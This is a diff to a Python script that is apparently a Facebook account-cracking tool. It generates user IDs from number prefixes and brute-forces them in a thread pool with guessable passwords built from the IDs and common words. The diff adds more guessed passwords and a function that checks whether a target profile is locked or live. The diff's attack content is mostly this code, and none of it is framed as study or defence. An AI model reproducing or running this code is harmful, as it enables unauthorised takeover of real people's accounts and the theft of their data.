@@ -1,5 +1,5 @@
 #coding by md alif
-from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as bxx
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
 import random
@@ -233,7 +233,7 @@ def ASRAF():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','jannat','tamanna','sadiya']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
@@ -296,4 +296,14 @@ def b(uid,pwx,tl):
     except:
 
         pass
+#---------lock check def------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=bxx(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
 Main()
